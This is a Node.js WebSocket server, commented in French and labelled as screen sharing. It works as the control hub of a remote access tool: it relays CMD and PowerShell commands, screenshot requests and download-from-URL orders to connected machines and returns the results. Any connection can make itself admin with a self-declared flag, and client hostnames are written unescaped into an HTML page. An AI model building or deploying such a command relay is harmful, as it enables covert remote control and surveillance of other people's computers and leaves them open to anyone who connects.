// SERVER NODE.JS avec WebSocket pour CLIENT VIEWER
// Installation requise: npm install ws express

const WebSocket = require('ws');
const express = require('express');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Stockage des clients connectés
const clients = new Map();
const chatHistory = [];

// Structure d'un client
class Client {
    constructor(ws, hostname) {
        this.ws = ws;
        this.hostname = hostname;
        this.id = generateId();
        this.connectedAt = new Date();
        this.isAdmin = false;
        this.lastScreenshot = null;
    }
}

// Génère un ID unique
function generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// Broadcast à tous les clients
function broadcast(message, excludeId = null) {
    clients.forEach((client, id) => {
        if (id !== excludeId && client.ws.readyState === WebSocket.OPEN) {
            try {
                client.ws.send(JSON.stringify(message));
            } catch (error) {
                console.error(`Erreur d'envoi au client ${id}:`, error.message);
            }
        }
    });
}

// Broadcast uniquement aux admins
function broadcastToAdmins(message) {
    clients.forEach((client) => {
        if (client.isAdmin && client.ws.readyState === WebSocket.OPEN) {
            try {
                client.ws.send(JSON.stringify(message));
            } catch (error) {
                console.error(`Erreur d'envoi à l'admin:`, error.message);
            }
        }
    });
}

// Envoie la liste des hostnames à tous les admins
function broadcastHostnames() {
    const hostnames = Array.from(clients.values())
        .filter(c => !c.isAdmin)
        .map(c => ({
            id: c.id,
            hostname: c.hostname,
            connectedAt: c.connectedAt
        }));
    
    broadcastToAdmins({
        type: 'hostnames_update',
        data: hostnames
    });
}

// Gestion des connexions WebSocket
wss.on('connection', (ws) => {
    console.log('📡 Nouvelle connexion établie');
    
    let currentClient = null;

    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            
            switch(message.type) {
                case 'register':
                    // Enregistrement d'un nouveau client
                    currentClient = new Client(ws, message.hostname);
                    currentClient.isAdmin = message.isAdmin || false;
                    clients.set(currentClient.id, currentClient);
                    
                    const clientType = currentClient.isAdmin ? '👨‍💼 ADMIN' : '🖥️  CLIENT';
                    console.log(`${clientType} connecté: ${currentClient.hostname} (${currentClient.id})`);
                    
                    // Confirmation au client
                    ws.send(JSON.stringify({
                        type: 'registered',
                        data: {
                            id: currentClient.id,
                            hostname: currentClient.hostname
                        }
                    }));
                    
                    // Si admin, envoyer la liste des clients et l'historique du chat
                    if (currentClient.isAdmin) {
                        ws.send(JSON.stringify({
                            type: 'chat_history',
                            data: chatHistory
                        }));
                    }
                    
                    // Mettre à jour la liste des hostnames
                    broadcastHostnames();
                    break;

                case 'chat_message':
                    // Message de chat
                    const chatMsg = {
                        id: generateId(),
                        username: message.username || currentClient.hostname,
                        message: message.message,
                        timestamp: new Date()
                    };
                    
                    chatHistory.push(chatMsg);
                    
                    // Garder seulement les 100 derniers messages
                    if (chatHistory.length > 100) {
                        chatHistory.shift();
                    }
                    
                    // Broadcast à tous
                    broadcast({
                        type: 'chat_message',
                        data: chatMsg
                    });
                    
                    console.log(`💬 ${chatMsg.username}: ${chatMsg.message}`);
                    break;

                case 'execute_command':
                    // Commande à exécuter sur un client cible
                    const targetClient = clients.get(message.targetId);
                    
                    if (targetClient && targetClient.ws.readyState === WebSocket.OPEN) {
                        targetClient.ws.send(JSON.stringify({
                            type: 'execute_command',
                            data: {
                                command: message.command,
                                commandType: message.commandType || 'cmd',
                                requestId: message.requestId
                            }
                        }));
                        
                        const cmdType = message.commandType === 'powershell' ? 'PowerShell' : 'CMD';
                        console.log(`📝 ${cmdType} → ${targetClient.hostname}: ${message.command}`);
                    } else {
                        // Client introuvable ou déconnecté
                        ws.send(JSON.stringify({
                            type: 'command_error',
                            data: {
                                requestId: message.requestId,
                                error: 'Client non disponible'
                            }
                        }));
                    }
                    break;

                case 'command_result':
                    // Résultat d'une commande exécutée par un client
                    broadcastToAdmins({
                        type: 'command_result',
                        data: {
                            clientId: currentClient.id,
                            hostname: currentClient.hostname,
                            requestId: message.requestId,
                            result: message.result,
                            success: message.success,
                            commandType: message.commandType || 'cmd'
                        }
                    });
                    
                    const resultType = message.commandType === 'powershell' ? 'PowerShell' : 'CMD';
                    console.log(`✅ Résultat ${resultType} de ${currentClient.hostname}`);
                    break;

                case 'screenshot':
                    // Screenshot d'un client (pour l'écran principal)
                    const screenshotTarget = clients.get(message.targetId);
                    
                    if (screenshotTarget && screenshotTarget.ws.readyState === WebSocket.OPEN) {
                        screenshotTarget.ws.send(JSON.stringify({
                            type: 'request_screenshot',
                            data: {
                                requestId: message.requestId
                            }
                        }));
                    }
                    break;

                case 'screenshot_chat':
                    // Screenshot d'un client (pour le tchat)
                    const screenshotChatTarget = clients.get(message.targetId);
                    
                    if (screenshotChatTarget && screenshotChatTarget.ws.readyState === WebSocket.OPEN) {
                        console.log(`📸 Envoi demande screenshot tchat à ${screenshotChatTarget.hostname}`);
                        screenshotChatTarget.ws.send(JSON.stringify({
                            type: 'request_screenshot_chat',
                            data: {
                                requestId: message.requestId,
                                username: message.username
                            }
                        }));
                        console.log(`✅ Demande envoyée au client`);
                    } else {
                        console.log(`❌ Client non trouvé ou déconnecté: ${message.targetId}`);
                    }
                    break;

                case 'screenshot_data':
                    // Données du screenshot reçues (pour l'écran principal)
                    if (currentClient) {
                        currentClient.lastScreenshot = message.imageData;
                    }
                    
                    // Broadcast UNIQUEMENT aux admins qui ont sélectionné ce client
                    // On envoie l'ID du client avec le screenshot pour que l'admin puisse filtrer
                    broadcastToAdmins({
                        type: 'screenshot_data',
                        data: {
                            clientId: currentClient.id,
                            hostname: currentClient.hostname,
                            requestId: message.requestId,
                            imageData: message.imageData
                        }
                    });
                    
                    // Logging plus discret pour les screenshots auto
                    if (message.requestId % 10 === 0) {
                        console.log(`📸 Screenshot de ${currentClient.hostname} (compteur: ${message.requestId})`);
                    }
                    break;

                case 'screenshot_data_chat':
                    // Screenshot pour le tchat
                    console.log(`📸📸 Screenshot tchat reçu de ${currentClient.hostname}`);
                    console.log(`   Taille: ${message.imageData ? message.imageData.length : 0} chars`);
                    
                    broadcast({
                        type: 'screenshot_chat',
                        data: {
                            clientId: currentClient.id,
                            hostname: currentClient.hostname,
                            requestId: message.requestId,
                            imageData: message.imageData
                        }
                    });
                    console.log(`✅✅ Screenshot broadcast à tous les clients!`);
                    break;

                case 'download_file':
                    // Téléchargement de fichier
                    const downloadTarget = clients.get(message.targetId);
                    
                    if (downloadTarget && downloadTarget.ws.readyState === WebSocket.OPEN) {
                        console.log(`📥 Demande de téléchargement → ${downloadTarget.hostname}`);
                        console.log(`   URL: ${message.url}`);
                        
                        downloadTarget.ws.send(JSON.stringify({
                            type: 'download_file',
                            data: {
                                url: message.url,
                                requestId: message.requestId
                            }
                        }));
                        console.log(`✅ Commande de téléchargement envoyée`);
                    } else {
                        console.log(`❌ Client non trouvé pour téléchargement: ${message.targetId}`);
                        ws.send(JSON.stringify({
                            type: 'download_result',
                            data: {
                                success: false,
                                message: 'Client non disponible'
                            }
                        }));
                    }
                    break;

                case 'download_result':
                    // Résultat du téléchargement
                    console.log(`📥 Résultat téléchargement de ${currentClient.hostname}: ${message.success ? 'SUCCESS' : 'FAILED'}`);
                    
                    broadcastToAdmins({
                        type: 'download_result',
                        data: {
                            clientId: currentClient.id,
                            hostname: currentClient.hostname,
                            success: message.success,
                            message: message.message,
                            filePath: message.filePath
                        }
                    });
                    break;

                case 'ping':
                    // Ping pour vérifier la connexion
                    ws.send(JSON.stringify({
                        type: 'pong',
                        timestamp: Date.now()
                    }));
                    break;

                default:
                    console.log(`⚠️  Type de message inconnu: ${message.type}`);
            }
            
        } catch (error) {
            console.error('❌ Erreur lors du traitement du message:', error);
        }
    });

    ws.on('close', () => {
        if (currentClient) {
            const clientType = currentClient.isAdmin ? '👨‍💼 ADMIN' : '🖥️  CLIENT';
            console.log(`🔌 ${clientType} déconnecté: ${currentClient.hostname} (${currentClient.id})`);
            clients.delete(currentClient.id);
            
            // Notifier la déconnexion
            broadcast({
                type: 'client_disconnected',
                data: {
                    id: currentClient.id,
                    hostname: currentClient.hostname
                }
            });
            
            // Mettre à jour la liste des hostnames
            broadcastHostnames();
        }
    });

    ws.on('error', (error) => {
        console.error('❌ Erreur WebSocket:', error);
    });
});

// Routes HTTP basiques
app.get('/', (req, res) => {
    const clientList = Array.from(clients.values()).map(c => 
        `<li>${c.isAdmin ? '👨‍💼 ADMIN' : '🖥️  CLIENT'}: ${c.hostname}</li>`
    ).join('');
    
    res.send(`
        <html>
        <head>
            <title>CLIENT VIEWER Server</title>
            <style>
                body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #fff; padding: 20px; }
                h1 { color: #4a9eff; }
                .stats { background: #2a2a2a; padding: 15px; border-radius: 5px; margin: 10px 0; }
                ul { list-style: none; padding: 0; }
                li { padding: 5px 0; }
            </style>
        </head>
        <body>
            <h1>🦔 CLIENT VIEWER Server</h1>
            <div class="stats">
                <p>✅ Serveur WebSocket actif sur le port ${PORT}</p>
                <p>👥 Clients connectés: ${clients.size}</p>
                <p>💬 Messages dans l'historique: ${chatHistory.length}</p>
                <p>⏱️  Uptime: ${Math.floor(process.uptime())}s</p>
            </div>
            <h2>Clients connectés:</h2>
            <ul>${clientList || '<li>Aucun client</li>'}</ul>
        </body>
        </html>
    `);
});

app.get('/status', (req, res) => {
    const clientList = Array.from(clients.values()).map(c => ({
        id: c.id,
        hostname: c.hostname,
        isAdmin: c.isAdmin,
        connectedAt: c.connectedAt,
        hasScreenshot: c.lastScreenshot !== null
    }));
    
    res.json({
        status: 'online',
        clients: clientList,
        chatMessages: chatHistory.length,
        uptime: process.uptime()
    });
});

// Démarrage du serveur
const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════╗
║   🦔 CLIENT VIEWER Server v1.0        ║
║   Partage d'écran en temps réel       ║
╠════════════════════════════════════════╣
║   Serveur démarré sur le port ${PORT.toString().padEnd(4)}   ║
║   WebSocket: ws://localhost:${PORT}      ║
║   HTTP: http://localhost:${PORT}         ║
╚════════════════════════════════════════╝
    `);
    console.log('💡 En attente de connexions...\n');
});

// Gestion de l'arrêt propre
process.on('SIGINT', () => {
    console.log('\n🛑 Arrêt du serveur...');
    wss.clients.forEach((ws) => {
        ws.close();
    });
    server.close(() => {
        console.log('✅ Serveur arrêté proprement');
        process.exit(0);
    });
});

// Log d'erreurs globales
process.on('uncaughtException', (error) => {
    console.error('❌ Erreur non capturée:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Promesse rejetée:', reason);
});
